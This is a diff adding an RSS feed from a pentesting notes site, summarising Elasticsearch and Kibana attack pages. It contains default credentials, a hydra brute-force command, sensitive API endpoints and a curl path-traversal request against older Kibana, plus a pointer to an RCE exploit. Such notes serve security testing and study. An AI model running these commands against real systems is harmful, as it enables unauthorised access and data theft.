@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Elasticsearch on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/web/elasticsearch/</link>
+    <description>Recent content in Elasticsearch on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 11:56:37 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/web/elasticsearch/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Elasticsearch Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/elasticsearch/elasticsearch-pentesting/</link>
+      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/elasticsearch/elasticsearch-pentesting/</guid>
+      <description>Default Credentials link admin:elasticadmin elastic:changeme Brute Force Credentials linkCrack the &amp;ldquo;Authorization&amp;rdquo; header in the web page.&#xA;hydra -L usernames.txt -P passwords.txt &amp;lt;target-ip&amp;gt; -s 9200 http-get / Common Directories link /_cat/ /_cat/indices /_cluster/ /_nodes/ /_remote/ /_security /_search?q=username /_search?q=password /_security/role /_security/user /_xpack/security/user/ </description>
+    </item>
+    <item>
+      <title>Kibana Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/elasticsearch/kibana-pentesting/</link>
+      <pubDate>Thu, 22 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/elasticsearch/kibana-pentesting/</guid>
+      <description>Vulnerabilities linkLocal File Inclusion (LFI) Version &amp;lt; 6.4.3 &amp;amp; 5.6.13 link curl http://&amp;lt;target-ip&amp;gt;:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;amp;apis=../../../../../../.../../../../root.txt Remote Code Execution (RCE) Version &amp;lt; 6.6.0 linkReference: https://github.com/mpgn/CVE-2019-7609</description>
+    </item>
+  </channel>
+</rss>
